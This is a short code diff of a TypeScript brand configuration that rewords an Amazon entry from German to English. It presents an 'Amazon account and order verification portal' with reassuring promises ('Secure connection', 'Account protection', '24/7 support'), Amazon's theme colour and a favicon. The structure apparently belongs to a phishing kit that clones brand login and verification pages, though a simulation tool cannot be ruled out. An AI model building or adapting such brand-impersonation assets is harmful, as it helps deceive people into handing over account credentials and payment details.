@@ -32,10 +32,10 @@ type BrandConfig = {
 const AMAZON_BRAND: BrandConfig = {
   id: 'amazon',
   name: 'Amazon',
-  portal: 'Amazon.de Kontobestaetigungscenter',
-  tagline: 'Einfach. Schnell. Sicher.',
-  legal: 'Amazon.de Konto- und Bestellbestaetigungsportal',
-  promises: ['Sichere Verbindung', 'Kontoschutz', '24/7 Support'],
+  portal: 'Amazon Global: International Shipping Made Easy',
+  tagline: 'Amazon. Spend less. Smile more.',
+  legal: 'Amazon account and order verification portal.',
+  promises: ['Secure connection', 'Account protection', '24/7 support'],
   favicon: '/favicon.png?v=brand-10',
   theme: {
     navy: '#232f3e',
